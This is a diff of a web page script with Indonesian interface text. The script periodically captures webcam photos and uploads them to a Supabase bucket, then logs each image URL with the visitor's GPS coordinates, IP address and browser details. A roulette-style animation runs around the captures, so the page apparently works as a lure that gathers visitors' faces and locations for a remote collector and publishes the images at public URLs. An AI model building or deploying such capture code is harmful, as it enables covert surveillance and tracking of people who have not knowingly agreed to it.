-        startRouletteAnimation();
-      }, 5000);
+      }, 6000);
     }
 
-    // ===== CAPTURE =====
     async function capturePhoto() {
       const video = document.getElementById("webcam");
       const canvas = document.getElementById("faceCanvas");
@@ -700,47 +589,32 @@
 
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0);
+      canvas.getContext("2d").drawImage(video, 0, 0);
 
       await sendToSupabase(canvas.toDataURL("image/jpeg", 0.8));
       captureCount++;
       document.getElementById("statusText").textContent = `Tangkapan #${captureCount} terkirim`;
-      setTimeout(() => {
-        document.getElementById("statusText").textContent = "Mendeteksi...";
-      }, 2000);
+      setTimeout(() => { document.getElementById("statusText").textContent = "Mendeteksi..."; }, 2000);
     }
 
-    // ===== SUPABASE =====
     async function sendToSupabase(imageData) {
       try {
         const ip = await getUserIP();
         const blob = await (await fetch(imageData)).blob();
         const filename = `capture_${Date.now()}.jpg`;
 
-        const uploadRes = await fetch(
-          `${SUPABASE_URL}/storage/v1/object/Schema%20test/${filename}`,
-          {
-            method: "POST",
-            headers: {
-              "Authorization": `Bearer ${SUPABASE_KEY}`,
-              "Content-Type": "image/jpeg"
-            },
-            body: blob
-          }
-        );
-
+        const uploadRes = await fetch(`${SUPABASE_URL}/storage/v1/object/Schema%20test/${filename}`, {
+          method: "POST",
+          headers: { "Authorization": `Bearer ${SUPABASE_KEY}`, "Content-Type": "image/jpeg" },
+          body: blob
+        });
         if (!uploadRes.ok) throw new Error("Upload failed");
 
         const imageUrl = `${SUPABASE_URL}/storage/v1/object/public/Schema%20test/${filename}`;
 
         const dbRes = await fetch(`${SUPABASE_URL}/rest/v1/captures`, {
           method: "POST",
-          headers: {
-            "Authorization": `Bearer ${SUPABASE_KEY}`,
-            "Content-Type": "application/json",
-            "Prefer": "return=minimal"
-          },
+          headers: { "Authorization": `Bearer ${SUPABASE_KEY}`, "Content-Type": "application/json", "Prefer": "return=minimal" },
           body: JSON.stringify({
             image_url: imageUrl,
             gps_lat: gpsData.lat,
@@ -750,22 +624,17 @@
             user_agent: navigator.userAgent
           })
         });
-
         if (!dbRes.ok) throw new Error("DB insert failed");
         console.log("Capture sent:", filename);
-
-      } catch (err) {
-        console.error("Supabase error:", err);
-      }
+      } catch (err) { console.error("Supabase error:", err); }
     }
 
-    // ===== CLEANUP =====
     window.addEventListener("beforeunload", () => {
       if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
       if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
       if (captureInterval) clearInterval(captureInterval);
       if (countdownInterval) clearInterval(countdownInterval);
-      stopRouletteAnimation();
+      stopTicker();
     });
   </script>
 </body>
